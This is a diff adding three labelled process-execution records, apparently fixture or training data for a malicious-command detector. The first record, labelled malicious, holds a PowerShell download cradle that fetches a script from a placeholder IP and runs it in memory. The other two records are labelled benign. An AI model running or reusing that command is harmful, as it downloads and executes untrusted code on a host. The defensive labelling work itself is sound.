@@ -1,0 +1,3 @@
+{"timestamp": "2026-10-12T09:14:03Z", "hostname": "WKSTN-042", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/payload.ps1')\"", "label": "malicious"}
+{"timestamp": "2026-10-12T09:31:44Z", "hostname": "WKSTN-042", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -ExecutionPolicy Bypass -File C:\\scripts\\nightly-backup.ps1", "label": "benign"}
+{"timestamp": "2026-10-12T10:02:19Z", "hostname": "SRV-011", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd /c whoami", "label": "benign"}
